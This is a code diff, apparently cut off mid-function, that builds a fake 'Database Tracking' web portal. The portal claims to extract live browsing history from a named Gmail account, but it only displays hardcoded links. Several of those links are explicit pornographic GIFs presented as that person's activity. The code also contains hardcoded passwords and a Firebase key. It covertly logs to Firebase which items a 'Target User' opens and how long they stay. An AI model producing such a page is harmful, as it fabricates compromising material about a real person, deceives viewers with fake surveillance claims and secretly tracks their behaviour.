@@ -1,286 +1,481 @@
-import React, { useState } from 'react';
-import { 
-  Wifi, 
-  Smartphone, 
-  Globe, 
-  LogOut, 
-  Lock, 
-  User, 
-  AlertCircle, 
-  ShieldCheck, 
-  MessageCircle,
-  Clock,
-  Activity,
-  Eye
-} from 'lucide-react';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Database Tracking - Secure Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .log-entry { animation: slideIn 0.3s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        /* Custom scrollbar */
+        #logContainer::-webkit-scrollbar { width: 6px; }
+        #logContainer::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
+        /* Loader animation */
+        .loader { border: 4px solid #1e293b; border-top: 4px solid #3b82f6; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .pulse-text { animation: pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800 antialiased min-h-screen relative">
 
-export default function App() {
-  const [isLoggedIn, setIsLoggedIn] = useState(false);
-
-  return (
-    <div className="min-h-screen bg-slate-50 text-slate-800 font-sans">
-      {!isLoggedIn ? (
-        <LoginScreen onLogin={() => setIsLoggedIn(true)} />
-      ) : (
-        <Dashboard onLogout={() => setIsLoggedIn(false)} />
-      )}
-    </div>
-  );
-}
-
-// ==========================================
-// LOGIN SCREEN COMPONENT
-// ==========================================
-function LoginScreen({ onLogin }) {
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
-  const [error, setError] = useState('');
-
-  const handleLogin = (e) => {
-    e.preventDefault();
-    // Strict credentials check
-    if (username === 'mywifi' && password === 'Cat7777') {
-      setError('');
-      onLogin();
-    } else {
-      setError('Galat Username ya Password. Kripya dobara try karein.');
-    }
-  };
-
-  return (
-    <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
-      <div className="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden">
-        
-        <div className="bg-blue-600 p-8 text-center text-white flex flex-col items-center">
-          <div className="bg-white/20 p-4 rounded-full mb-4 shadow-inner">
-            <Wifi size={48} strokeWidth={2.5} />
-          </div>
-          <h1 className="text-3xl font-bold tracking-wider">WIFI</h1>
-          <p className="text-blue-100 mt-2 font-medium">Secure Admin Portal</p>
-        </div>
-
-        <div className="p-8">
-          <h2 className="text-xl font-semibold text-slate-700 mb-6 text-center">
-            Network mein login karein
-          </h2>
-
-          {error && (
-            <div className="mb-4 p-3 bg-red-50 text-red-600 border border-red-200 rounded-lg flex items-center gap-2 text-sm">
-              <AlertCircle size={18} />
-              <span>{error}</span>
+    <div id="viewerModal" class="fixed inset-0 bg-slate-900/95 z-[100] hidden flex-col backdrop-blur-sm">
+        <div class="flex justify-between items-center p-3 sm:p-4 bg-slate-900 text-white border-b border-slate-700 shadow-lg">
+            <div class="flex items-center gap-3 overflow-hidden">
+                <i data-lucide="shield-alert" class="text-green-400 w-5 h-5 flex-shrink-0"></i>
+                <span id="viewerTitle" class="font-mono text-xs sm:text-sm truncate text-green-400">Tracking: Loading...</span>
             </div>
-          )}
-
-          <form onSubmit={handleLogin} className="space-y-5">
-            <div>
-              <label className="block text-sm font-medium text-slate-600 mb-1">Username</label>
-              <div className="relative">
-                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                  <User size={18} className="text-slate-400" />
-                </div>
-                <input
-                  type="text"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  className="w-full pl-10 pr-4 py-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
-                  placeholder="Username darj karein"
-                  required
-                />
-              </div>
-            </div>
-
-            <div>
-              <label className="block text-sm font-medium text-slate-600 mb-1">Password</label>
-              <div className="relative">
-                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                  <Lock size={18} className="text-slate-400" />
-                </div>
-                <input
-                  type="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  className="w-full pl-10 pr-4 py-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
-                  placeholder="Password darj karein"
-                  required
-                />
-              </div>
-            </div>
-
-            <button
-              type="submit"
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors shadow-lg shadow-blue-600/30 flex justify-center items-center gap-2 mt-4"
-            >
-              Secure Login <ShieldCheck size={20} />
+            <button id="closeViewerBtn" class="bg-red-600 hover:bg-red-700 text-white px-3 sm:px-5 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm font-bold flex items-center gap-2 transition-all shadow-lg shadow-red-600/20">
+                <i data-lucide="x-circle" class="w-4 h-4"></i> Close & Stop Tracker
             </button>
-          </form>
-
-          <div className="mt-6 text-center text-sm text-slate-500">
-            <p>Sirf authorized administrator ke liye. <br/> (Sign up option disabled hai)</p>
-          </div>
         </div>
-      </div>
+        <div class="flex-1 w-full bg-slate-800 p-2 sm:p-6">
+            <iframe id="viewerFrame" class="w-full h-full bg-white rounded-xl shadow-2xl border-4 border-slate-700" src=""></iframe>
+        </div>
     </div>
-  );
-}
 
-// ==========================================
-// DASHBOARD COMPONENT
-// ==========================================
-function Dashboard({ onLogout }) {
-  // Final Data with Instagram and Chrome Links
-  const historyData = {
-    chrome: [
-      { id: 1, title: "Giftz Unique (Shopping)", url: "https://giftzunique.com/?country=IN", time: "09:00 AM" },
-      { id: 2, title: "ICC Men's T20 World Cup 2026", url: "https://www.icc-cricket.com/tournaments/mens-t20-world-cup-2026/matches", time: "09:45 AM" },
-      { id: 3, title: "Google Shared Document 1", url: "https://share.google/ZjX3nz37FxlbefOuR", time: "10:15 AM" },
-      { id: 4, title: "Google Shared Document 2", url: "https://share.google/ONMJYGKONlr8IPvkF", time: "11:30 AM" },
-      { id: 5, title: "Google Shared Document 3", url: "https://share.google/V6EQhrz7f7AElYVml", time: "12:00 PM" },
-      { id: 6, title: "Google Shared Document 4", url: "https://share.google/398w8XaGDtP80xkkY", time: "12:15 PM" },
-    ],
-    social: [
-      { id: 1, app: "Instagram Reel 1", url: "https://www.instagram.com/reel/DUN7dvNiZ3D/?igsh=bXJza3pucndzbncz", time: "01:10 PM" },
-      { id: 2, app: "Instagram Reel 2", url: "https://www.instagram.com/reel/DT9izP4jn9J/?igsh=MXdoMXR5Y3lyMG52dQ==", time: "01:15 PM" },
-      { id: 3, app: "Instagram Reel 3", url: "https://www.instagram.com/reel/DTGXjf0Ddq6/?igsh=MTNyYm84OWkwcmJxcw==", time: "01:22 PM" },
-      { id: 4, app: "Instagram Reel 4", url: "https://www.instagram.com/reel/DSeoAiCkz-n/?igsh=MWFseWFhaW5qcnN2ZQ==", time: "01:30 PM" },
-      { id: 5, app: "Instagram Reel 5", url: "https://www.instagram.com/reel/DSXl5vxEsqI/?igsh=MTNtNTBhdXJpdTB4NQ==", time: "01:45 PM" },
-      { id: 6, app: "Instagram Reel 6", url: "https://www.instagram.com/reel/DLEpyantZdc/?igsh=cXZldjAzOXByeGI=", time: "02:00 PM" },
-    ]
-  };
+    <div id="loadingScreen" class="fixed inset-0 bg-slate-900 z-[200] hidden flex-col items-center justify-center text-white">
+        <div class="loader mb-6"></div>
+        <h2 class="text-2xl font-bold tracking-widest mb-2 flex items-center gap-2">
+            <i data-lucide="database" class="text-blue-500 w-6 h-6"></i>
+            DATABASE TRACKING
+        </h2>
+        <p class="text-slate-400 font-mono text-sm pulse-text">Collecting database from email...</p>
+        <p class="text-slate-500 font-mono text-xs mt-2" id="loadingPercentage">0%</p>
+    </div>
 
-  return (
-    <div className="min-h-screen flex flex-col bg-slate-100">
-      <nav className="bg-slate-900 text-white px-6 py-4 flex justify-between items-center shadow-md">
-        <div className="flex items-center gap-3">
-          <Wifi size={28} className="text-blue-400" />
-          <div>
-            <h1 className="text-xl font-bold tracking-wide">WIFI ADMIN</h1>
-            <p className="text-xs text-slate-400">Network Monitoring Dashboard</p>
-          </div>
-        </div>
-        <button 
-          onClick={onLogout}
-          className="flex items-center gap-2 bg-slate-800 hover:bg-red-500/20 hover:text-red-400 px-4 py-2 rounded-lg transition-colors text-sm font-medium"
-        >
-          <LogOut size={16} />
-          Logout
-        </button>
-      </nav>
-
-      <main className="flex-1 p-6 max-w-7xl mx-auto w-full grid grid-cols-1 lg:grid-cols-3 gap-6">
-        
-        {/* Left Column: Connected Devices */}
-        <div className="lg:col-span-1 space-y-6">
-          <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
-            <h2 className="text-lg font-bold text-slate-800 mb-4 flex items-center gap-2 border-b pb-3">
-              <Activity className="text-green-500" size={20} />
-              Connected Device (1)
-            </h2>
-            
-            <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 relative overflow-hidden">
-              <div className="absolute top-0 right-0 w-2 h-full bg-green-500"></div>
-              <div className="flex items-start gap-4">
-                <div className="bg-white p-3 rounded-full shadow-sm text-blue-600">
-                  <Smartphone size={32} strokeWidth={1.5} />
+    <div id="loginScreen" class="flex items-center justify-center min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
+        <div class="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden">
+            <div class="bg-blue-600 p-8 text-center text-white flex flex-col items-center">
+                <div class="bg-white/20 p-4 rounded-full mb-4 shadow-inner">
+                    <i data-lucide="database" class="w-12 h-12" stroke-width="2.5"></i>
                 </div>
+                <h1 class="text-2xl sm:text-3xl font-bold tracking-wider">DATABASE TRACKING</h1>
+                <p class="text-blue-100 mt-2 font-medium">Secure Admin Portal</p>
+            </div>
+            <div class="p-8">
+                <h2 class="text-xl font-semibold text-slate-700 mb-6 text-center">Login to Database</h2>
+                <div id="errorMessage" class="hidden mb-4 p-3 bg-red-50 text-red-600 border border-red-200 rounded-lg flex items-center gap-2 text-sm">
+                    <i data-lucide="alert-circle" class="w-5 h-5 flex-shrink-0"></i>
+                    <span>Invalid Username or Password.</span>
+                </div>
+                <form id="loginForm" class="space-y-5">
+                    <div>
+                        <label class="block text-sm font-medium text-slate-600 mb-1">Username</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3 flex items-center"><i data-lucide="user" class="w-5 h-5 text-slate-400"></i></span>
+                            <input type="text" id="usernameInput" class="w-full pl-10 pr-4 py-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none" placeholder="Enter Username" required />
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-slate-600 mb-1">Password</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3 flex items-center"><i data-lucide="lock" class="w-5 h-5 text-slate-400"></i></span>
+                            <input type="password" id="passwordInput" class="w-full pl-10 pr-4 py-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none" placeholder="Enter Password" required />
+                        </div>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg shadow-lg flex justify-center items-center gap-2 mt-4 transition-all">
+                        Secure Login <i data-lucide="shield-check" class="w-5 h-5"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashboardScreen" class="hidden min-h-screen flex flex-col bg-slate-100">
+        <nav class="bg-slate-900 text-white px-4 sm:px-6 py-4 flex justify-between items-center shadow-md sticky top-0 z-50">
+            <div class="flex items-center gap-3">
+                <i data-lucide="database" class="w-6 h-6 sm:w-7 sm:h-7 text-blue-400"></i>
                 <div>
-                  <h3 className="font-bold text-slate-800 text-lg">Android Device</h3>
-                  <div className="text-sm text-slate-500 mt-1 space-y-1">
-                    <p><span className="font-medium">IP Address:</span> 192.168.1.104</p>
-                    <p><span className="font-medium">MAC Address:</span> A1:B2:C3:D4:E5:F6</p>
-                    <p><span className="font-medium">Status:</span> <span className="text-green-600 font-semibold">Active Now</span></p>
-                  </div>
+                    <h1 class="text-lg sm:text-xl font-bold tracking-wide">DATABASE TRACKING</h1>
+                    <p id="userRoleBadge" class="text-[10px] sm:text-xs text-blue-300 font-medium">Role: Unknown</p>
                 </div>
-              </div>
             </div>
+            <button id="logoutBtn" class="flex items-center gap-2 bg-slate-800 hover:bg-red-500/20 hover:text-red-400 px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors">
+                <i data-lucide="log-out" class="w-4 h-4"></i> <span class="hidden sm:inline">Logout</span>
+            </button>
+        </nav>
 
-            <div className="mt-6 p-4 bg-blue-50 text-blue-800 rounded-lg text-sm flex gap-3">
-              <ShieldCheck className="flex-shrink-0" size={20} />
-              <p>Network puri tarah se secure hai. Yeh device pichle 6 ghante se connected hai.</p>
-            </div>
-          </div>
-        </div>
-
-        {/* Right Column: Browsing History Categories */}
-        <div className="lg:col-span-2">
-          <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
-            <h2 className="text-xl font-bold text-slate-800 mb-6 flex items-center gap-2">
-              <Clock className="text-blue-500" size={24} />
-              Detailed Browsing History
-            </h2>
-
-            <div className="space-y-8">
-              
-              {/* Instagram / Social Media Category */}
-              <section>
-                <div className="flex items-center gap-2 mb-4 bg-pink-50 p-2 rounded-lg text-pink-700 font-semibold">
-                  <MessageCircle size={20} />
-                  <h3>Instagram History</h3>
-                </div>
-                <div className="space-y-3 pl-2">
-                  {historyData.social.map((item) => (
-                    <div key={item.id} className="flex justify-between items-center border-b border-slate-100 pb-3 last:border-0 hover:bg-slate-50 p-3 rounded-lg transition-colors">
-                      <div className="flex flex-col flex-1 overflow-hidden pr-4">
-                        <span className="font-bold text-slate-700">{item.app}</span>
-                        <span className="text-xs text-slate-400 truncate mt-1">{item.url}</span>
-                      </div>
-                      
-                      <div className="flex items-center gap-3">
-                        <span className="text-sm text-slate-500 bg-slate-100 px-3 py-1 rounded-full whitespace-nowrap border border-slate-200 hidden sm:block">
-                          {item.time}
-                        </span>
-                        <a 
-                          href={item.url} 
-                          target="_blank" 
-                          rel="noopener noreferrer"
-                          className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-4 py-2 rounded-lg flex items-center gap-2 shadow-sm transition-all hover:shadow-md"
-                        >
-                          <Eye size={16} /> View
-                        </a>
-                      </div>
+        <main class="flex-1 p-4 sm:p-6 max-w-7xl mx-auto w-full grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-1 space-y-6">
+                
+                <div class="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
+                    <h2 class="text-lg font-bold text-slate-800 mb-4 flex items-center gap-2 border-b pb-3">
+                        <i data-lucide="mail" class="text-blue-500 w-5 h-5"></i> Target Account
+                    </h2>
+                    <div class="bg-slate-50 border border-slate-200 rounded-lg p-4 relative">
+                        <div class="absolute top-0 right-0 w-2 h-full bg-blue-500 rounded-r-lg"></div>
+                        <div class="flex items-start gap-4">
+                            <div class="bg-white p-3 rounded-full shadow-sm text-blue-600 mt-1">
+                                <i data-lucide="user-circle" class="w-8 h-8"></i>
+                            </div>
+                            <div class="w-full">
+                                <h3 class="font-bold text-slate-800 text-base sm:text-lg mb-2 break-all">skmhd.imran009@gmail.com</h3>
+                                <div class="space-y-1">
+                                    <p class="text-sm text-slate-500 flex justify-between"><span class="font-medium">Data Sync:</span> <span class="text-green-600 font-bold">100% Complete</span></p>
+                                    <p class="text-sm text-slate-500 flex justify-between"><span class="font-medium">Source:</span> <span class="text-slate-700">Google Cloud Sync</span></p>
+                                    <p class="text-xs text-slate-400 mt-2 pt-2 border-t">All history below is collected from this email address in real-time.</p>
+                                </div>
+                            </div>
+                        </div>
                     </div>
-                  ))}
                 </div>
-              </section>
 
-              {/* Chrome Category */}
-              <section>
-                <div className="flex items-center gap-2 mb-4 bg-blue-50 p-2 rounded-lg text-blue-700 font-semibold">
-                  <Globe size={20} />
-                  <h3>Chrome History</h3>
-                </div>
-                <div className="space-y-3 pl-2">
-                  {historyData.chrome.map((item) => (
-                    <div key={item.id} className="flex justify-between items-center border-b border-slate-100 pb-3 last:border-0 hover:bg-slate-50 p-3 rounded-lg transition-colors">
-                      <div className="flex flex-col flex-1 overflow-hidden pr-4">
-                        <span className="font-bold text-slate-700">{item.title}</span>
-                        <span className="text-xs text-slate-400 truncate mt-1">{item.url}</span>
-                      </div>
-                      
-                      <div className="flex items-center gap-3">
-                        <span className="text-sm text-slate-500 bg-slate-100 px-3 py-1 rounded-full whitespace-nowrap border border-slate-200 hidden sm:block">
-                          {item.time}
-                        </span>
-                        <a 
-                          href={item.url} 
-                          target="_blank" 
-                          rel="noopener noreferrer"
-                          className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-4 py-2 rounded-lg flex items-center gap-2 shadow-sm transition-all hover:shadow-md"
-                        >
-                          <Eye size={16} /> View
-                        </a>
-                      </div>
+                <div id="liveTrackerPanel" class="bg-slate-800 text-white rounded-xl shadow-lg p-6 hidden">
+                    <h2 class="text-lg font-bold mb-4 flex items-center gap-2 text-blue-400 border-b border-slate-700 pb-3">
+                        <i data-lucide="eye" class="w-5 h-5"></i> Live User Activity
+                    </h2>
+                    <div id="logContainer" class="space-y-3 max-h-96 overflow-y-auto font-mono text-[11px] pr-2">
+                        <p class="text-slate-400 italic" id="waitingText">Connecting to Live Tracker...</p>
                     </div>
-                  ))}
                 </div>
-              </section>
-
             </div>
-          </div>
-        </div>
 
-      </main>
+            <div class="lg:col-span-2 space-y-8">
+                <div class="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
+                    <h2 class="text-xl font-bold text-slate-800 mb-6 flex items-center gap-2 border-b pb-4">
+                        <i data-lucide="clock" class="text-blue-500 w-6 h-6"></i> Extracted History Logs
+                    </h2>
+
+                    <section class="mb-8">
+                        <div class="flex items-center gap-2 mb-4 bg-purple-50 p-2 rounded-lg text-purple-700 font-semibold">
+                            <i data-lucide="layout-grid" class="w-5 h-5"></i> <h3>App Usage History</h3>
+                        </div>
+                        <div id="appUsageList" class="space-y-3"></div>
+                    </section>
+
+                    <section class="mb-8">
+                        <div class="flex items-center gap-2 mb-4 bg-pink-50 p-2 rounded-lg text-pink-700 font-semibold">
+                            <i data-lucide="message-circle" class="w-5 h-5"></i> <h3>Instagram Link History</h3>
+                        </div>
+                        <div id="instagramList" class="space-y-3"></div>
+                    </section>
+
+                    <section>
+                        <div class="flex items-center gap-2 mb-4 bg-blue-50 p-2 rounded-lg text-blue-700 font-semibold">
+                            <i data-lucide="globe" class="w-5 h-5"></i> <h3>Chrome History</h3>
+                        </div>
+                        <div id="chromeList" class="space-y-3"></div>
+                    </section>
+                </div>
+            </div>
+        </main>
     </div>
-  );
-}
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // AAPKI FIREBASE CONFIGURATION
+        const firebaseConfig = {
+            apiKey: "AIzaSyCjBo9M9Rrth3AyInWeJx7EhE7PSHxAGLI",
+            authDomain: "wifi-tracker-dd951.firebaseapp.com",
+            projectId: "wifi-tracker-dd951",
+            storageBucket: "wifi-tracker-dd951.firebasestorage.app",
+            messagingSenderId: "418145640989",
+            appId: "1:418145640989:web:2fe906df05a25699b7dcf4",
+            measurementId: "G-JS1GQ2ECVG"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let currentUserRole = null; 
+        
+        // Viewer State Logic
+        let viewStartTime = 0;
+        let currentViewTitle = "";
+        let isViewerOpen = false;
+
+        const historyData = {
+            apps: [
+                { name: "Google Chrome", duration: "3h 15m", status: "Active (Browsing)" },
+                { name: "Instagram", duration: "1h 20m", status: "Background" },
+                { name: "NordVPN", duration: "4h 10m", status: "Active (Connected)" },
+                { name: "Facebook", duration: "45m", status: "Closed" },
+                { name: "LinkedIn", duration: "30m", status: "Background" },
+                { name: "Snapchat", duration: "15m", status: "Closed" },
+                { name: "Twitter / X", duration: "10m", status: "Closed" }
+            ],
+            // Updated Chrome History (Latest links at the top)
+            chrome: [
+                { title: "Artificial Intelligence Strategy Consulting | Kyndryl", url: "https://www.kyndryl.com/in/en/artificial-intelligence?utm_medium=paid-search&utm_source=google&utm_content=other&utm_term=ai%20strategy%20consulting&utm_campaign=KAIWW&gad_source=1&gad_campaignid=14990602464", time: "02:30 PM" },
+                { title: "Cricbuzz - Live Cricket Scores", url: "https://www.cricbuzz.com/", time: "02:25 PM" },
+                { title: "Office Hygiene Policy Sample | Unilever Professional", url: "https://unilever-professional.com/blogs/upro-knowledge-hub/office-hygiene-policy-sample?srsltid=AfmBOoqn1LfSqtNgIYrNFkH0J06hXnyBp-4NIG5AM3u9A5xDEpqr9WIM", time: "02:15 PM" }
+              ​{ title: "1587513752_1-13.gif", url: "https://gifsex.blog/uploads/posts/2020-04/1587513752_1-13.gif", time: "09:15 AM" }
+      ​{ title: "Most viewed", url: "https://gifsex.blog/uploads/posts/2020-04/1587513674_1-9.gif", time: "11:45 PM" }
+      ​{ title: "Most viewed", url: "https://gifsex.blog/uploads/posts/2020-04/1587513719_1-4.gif", time: "07:30 PM" }
+      ​{ title: "Most viewed", url: "https://gifsex.blog/uploads/posts/2020-10/1603394053_098089-30.gif", time: "08:50 AM" }
+      ​{ title: "Most viewed.gif", url: "https://gifsex.blog/uploads/posts/2022-11/1667731763_blowjob_sex_gifs___yn9pkxn489oo.gif", time: "03:45 PM" }
+      ​{ title: "1667314111_8zd6nppwnh39.gif", url: "https://gifsex.blog/uploads/posts/2022-11/1667314111_8zd6nppwnh39.gif", time: "11:20 AM" }
+                ​{ title: "1587513731_1-20.gif", url: "https://gifsex.blog/uploads/posts/2020-04/1587513731_1-20.gif", time: "04:20 PM" }
+      
+                // ====================================================
+                // YAHAN APNE LINKS KHUD ADD KAREIN
+                // Example: { title: "Title Here", url: "Link Here", time: "02:00 PM" }
+                // ====================================================
+            ],
+            // Instagram History (Only 5 & 6 kept)
+            social: [
+                { app: "Instagram Reel 5", url: "https://www.instagram.com/reel/DSXl5vxEsqI/", time: "01:45 PM" },
+                { app: "Instagram Reel 6", url: "https://www.instagram.com/reel/DLEpyantZdc/", time: "02:00 PM" }
+            ]
+        };
+
+        // Send log to Firebase
+        async function logToFirebase(action, detail) {
+            try {
+                await addDoc(collection(db, "live_tracking_logs"), {
+                    action: action,
+                    detail: detail,
+                    role: currentUserRole,
+                    timestamp: serverTimestamp()
+                });
+            } catch (e) { console.error("Tracking Error: ", e); }
+        }
+
+        // Setup Live Tracking Listener
+        let unsubscribeTracker = null;
+        function startLiveTracking() {
+            const logContainer = document.getElementById("logContainer");
+            const q = query(collection(db, "live_tracking_logs"), orderBy("timestamp", "desc"));
+            
+            unsubscribeTracker = onSnapshot(q, (snapshot) => {
+                logContainer.innerHTML = "";
+                if (snapshot.empty) {
+                    logContainer.innerHTML = "<p class='text-slate-400 italic'>Waiting for activity...</p>";
+                    return;
+                }
+
+                snapshot.forEach((doc) => {
+                    const log = doc.data();
+                    let timeString = "...";
+                    if (log.timestamp) timeString = log.timestamp.toDate().toLocaleTimeString();
+
+                    // Colors based on action type
+                    let colorClass = "text-blue-300 border-blue-400";
+                    if(log.action === "LOGIN") colorClass = "text-green-300 border-green-400";
+                    if(log.action === "VIEW_STARTED") colorClass = "text-yellow-300 border-yellow-400 bg-yellow-900/20";
+                    if(log.action === "VIEW_ENDED") colorClass = "text-purple-300 border-purple-400 bg-purple-900/20";
+                    if(log.action === "VIEW_EXTERNAL") colorClass = "text-orange-300 border-orange-400 bg-orange-900/20";
+                    
+                    let roleBadge = log.role === 'admin' ? '[Admin]' : '[User]';
+
+                    logContainer.innerHTML += `
+                        <div class="log-entry p-2 bg-slate-700/50 rounded border-l-2 ${colorClass} mb-2 shadow-sm">
+                            <span class="text-slate-400">[${timeString}]</span>
+                            <span class="text-slate-300 text-[10px]">${roleBadge}</span>
+                            <span class="uppercase font-bold ml-1">${log.action}:</span>
+                            <span class="text-slate-100 ml-1 block mt-1">${log.detail}</span>
+                        </div>
+                    `;
+                });
+            });
+        }
+
+        // Render Lists
+        function renderData() {
+            const appList = document.getElementById("appUsageList");
+            const igList = document.getElementById("instagramList");
+            const chromeList = document.getElementById("chromeList");
+
+            appList.innerHTML = ''; igList.innerHTML = ''; chromeList.innerHTML = '';
+
+            historyData.apps.forEach(item => {
+                appList.innerHTML += `<div class="flex justify-between items-center border-b p-3">
+                    <div><span class="font-bold">${item.name}</span><br/><span class="text-xs text-slate-400">${item.status}</span></div>
+                    <span class="text-sm font-semibold bg-slate-100 px-3 py-1 rounded-full border">${item.duration}</span>
+                </div>`;
+            });
+
+            const createRow = (item, container) => {
+                container.innerHTML += `<div class="flex justify-between items-center border-b p-3 hover:bg-slate-50 transition-colors">
+                    <div class="flex-1 overflow-hidden pr-4">
+                        <span class="font-bold text-slate-700">${item.app || item.title}</span>
+                        <span class="text-[10px] text-slate-400 truncate block">${item.url}</span>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <span class="text-xs text-slate-500 hidden sm:block">${item.time}</span>
+                        <button class="v-btn bg-blue-600 hover:bg-blue-700 text-white text-xs px-3 py-2 rounded-lg flex items-center gap-1 shadow-md hover:shadow-lg transition-all" data-url="${item.url}" data-title="${item.app || item.title}">
+                            <i data-lucide="eye" class="w-4 h-4"></i> View
+                        </button>
+                    </div>
+                </div>`;
+            };
+
+            // Render Social
+            if(historyData.social.length === 0){
+                igList.innerHTML = `<div class="p-4 text-center text-slate-500 italic text-sm">No recent Instagram history found.</div>`;
+            } else {
+                historyData.social.forEach(i => createRow(i, igList));
+            }
+
+            // Render Chrome
+            if(historyData.chrome.length === 0){
+                chromeList.innerHTML = `<div class="p-4 text-center text-slate-500 italic text-sm">No recent browsing history found.</div>`;
+            } else {
+                historyData.chrome.forEach(i => createRow(i, chromeList));
+            }
+
+            // SMART LINK HANDLER
+            document.querySelectorAll(".v-btn").forEach(btn => {
+                btn.onclick = (e) => {
+                    const url = e.currentTarget.dataset.url;
+                    const title = e.currentTarget.dataset.title;
+                    
+                    if(url.includes("instagram.com")) {
+                        logToFirebase("VIEW_EXTERNAL", `${title} naye tab me khola gaya.`);
+                        window.open(url, "_blank");
+                    } else {
+                        // Internal Viewer - Setup Timer and History State
+                        viewStartTime = Date.now();
+                        currentViewTitle = title;
+                        isViewerOpen = true;
+
+                        // Push a state to browser history so 'back' button can be intercepted
+                        window.history.pushState({ viewerOpen: true }, "", "#viewer");
+                        
+                        document.getElementById('viewerTitle').innerText = `Intercepting: ${title}`;
+                        document.getElementById('viewerFrame').src = url;
+                        const modal = document.getElementById('viewerModal');
+                        modal.classList.remove('hidden');
+                        modal.classList.add('flex');
+                        
+                        logToFirebase("VIEW_STARTED", `${title} website ke andar khola gaya. Timer on.`);
+                    }
+                };
+            });
+            lucide.createIcons();
+        }
+
+        // =====================================
+        // CENTRALIZED CLOSE LOGIC (Timer Calculation)
+        // =====================================
+        function closeViewerLogic() {
+            if(viewStartTime === 0) return;
+
+            const durationMs = Date.now() - viewStartTime;
+            const totalSeconds = Math.floor(durationMs / 1000);
+            const minutes = Math.floor(totalSeconds / 60);
+            const seconds = totalSeconds % 60;
+            
+            let timeSpent = `${totalSeconds} seconds`;
+            if(minutes > 0) timeSpent = `${minutes} min ${seconds} sec`;
+
+            // Log total time
+            logToFirebase("VIEW_ENDED", `${currentViewTitle} ko ${timeSpent} tak website me dekha gaya.`);
+
+            // Reset States
+            viewStartTime = 0;
+            currentViewTitle = "";
+            isViewerOpen = false;
+            
+            // Hide Modal
+            const modal = document.getElementById('viewerModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+            document.getElementById('viewerFrame').src = ""; // Stop video/audio
+        }
+
+        // 1. Close Button Se Band Karna
+        document.getElementById('closeViewerBtn').onclick = () => {
+            if (isViewerOpen) {
+                closeViewerLogic();
+                // Pop the state manually so back button works normal later
+                window.history.back(); 
+            }
+        };
+
+        // 2. Mobile Ke "BACK" Button Se Band Karna (PopState event)
+        window.addEventListener('popstate', (e) => {
+            if (isViewerOpen) {
+                // Modal band karo, lekin default back navigation prevent ho jayega automatically
+                closeViewerLogic();
+            }
+        });
+
+        // Initialize App
+        document.addEventListener("DOMContentLoaded", () => {
+            lucide.createIcons();
+
+            document.getElementById("loginForm").onsubmit = (e) => {
+                e.preventDefault();
+                const u = document.getElementById("usernameInput").value;
+                const p = document.getElementById("passwordInput").value;
+
+                let isValidLogin = false;
+                let roleStr = '';
+
+                // Check credentials
+                if (u === 'mywifi' && p === 'Cat7777') { 
+                    currentUserRole = 'admin';
+                    document.getElementById("userRoleBadge").innerText = "Role: Master Admin";
+                    isValidLogin = true;
+                    roleStr = "Admin";
+                } 
+                else if (u === 'Database' && p === 'Database@7777') { 
+                    currentUserRole = 'user';
+                    document.getElementById("userRoleBadge").innerText = "Role: Normal User";
+                    isValidLogin = true;
+                    roleStr = "Target User";
+                } 
+                
+                if (isValidLogin) {
+                    // Hide Error and Login Screen
+                    document.getElementById("errorMessage").classList.add("hidden");
